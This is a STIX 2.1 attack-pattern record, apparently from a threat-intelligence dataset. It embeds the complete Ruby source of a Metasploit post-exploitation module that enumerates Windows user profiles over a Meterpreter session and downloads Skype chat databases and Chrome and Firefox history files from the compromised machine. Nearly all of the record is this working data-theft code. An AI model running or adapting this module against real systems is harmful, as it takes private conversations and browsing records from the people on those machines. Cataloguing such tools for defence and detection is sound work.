{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--26f155cb-381b-4a1a-99e0-cb9dc93dab7f",
    "created": "2024-08-14T16:33:06.173503Z",
    "modified": "2024-08-14T16:33:06.173507Z",
    "name": "Windows Gather Skype, Firefox, and Chrome Artifacts",
    "description": " Gathers Skype chat logs, Firefox history, and Chrome history data from the target machine.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/forensics/browser_history.rb",
            "external_id": "browser_history.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'csv'\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::Windows::Registry\n\n  STORE_FILE_TYPE = 'binary/db'\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Skype, Firefox, and Chrome Artifacts',\n        'Description' => %q{\n          Gathers Skype chat logs, Firefox history, and Chrome history data from the target machine.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Joshua Harper <josh[at]radixtx.com>' # @JonValt\n        ],\n        'Platform' => %w[win],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_close\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              stdapi_fs_search\n              stdapi_fs_separator\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  #\n  # Execute the module.\n  #\n  def run\n    print_status('Gathering user profiles')\n\n    files_to_gather = [\n      { path: 'LocalAppData', name: 'Chrome History', dir: 'Google', fname: 'History.' },\n      { path: 'LocalAppData', name: 'Chrome Archived History', dir: 'Google', fname: 'Archived History.' },\n      { path: 'AppData', name: 'Skype', dir: 'Skype', fname: 'main.db' },\n      { path: 'AppData', name: 'Firefox', dir: 'Mozilla', fname: 'places.sqlite' }\n    ]\n\n    grab_user_profiles.each do |userprofile|\n      files_to_gather.each { |f| download_artifact(userprofile, f) }\n    end\n  end\n\n  #\n  # Check to see if the artifact exists on the remote system.\n  #\n  def check_artifact(profile, opts = {})\n    path = profile[opts[:path]]\n    dir = opts[:dir]\n\n    dirs = session.fs.dir.foreach(path).collect\n\n    return dirs.include? dir\n  end\n\n  #\n  # Download the artifact from the remote system if it exists.\n  #\n  def download_artifact(profile, opts = {})\n    name = opts[:name]\n\n    print_status(\"Checking for #{name} artifacts...\")\n    if !check_artifact(profile, opts)\n      print_error(\"#{name} directory not found for #{profile['UserName']}\")\n      return false\n    end\n\n    print_good(\"#{name} directory found #{profile['UserName']}\")\n\n    fname = opts[:fname]\n    dir = opts[:dir]\n    path = opts[:path]\n\n    artifact_path = \"#{profile[path]}\\\\#{dir}\"\n    file = session.fs.file.search(artifact_path, fname.to_s, true)\n\n    return false unless file\n\n    file.each do |db|\n      guid = db['path'].split('\\\\')\n      # Using store_local for full control of output filename. Forensics software can be picky about the files it's given.\n      local_loc = \"#{profile['UserName']}_#{name}_#{guid.last}_#{fname}\"\n      file_loc = store_local('artifact', STORE_FILE_TYPE, session, local_loc)\n      maindb = \"#{db['path']}#{session.fs.file.separator}#{db['name']}\"\n      print_status(\"Downloading #{maindb}\")\n      session.fs.file.download_file(file_loc, maindb)\n      print_good(\"#{name} artifact file saved to #{file_loc}\")\n    end\n    return true\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[win]"
    ]
}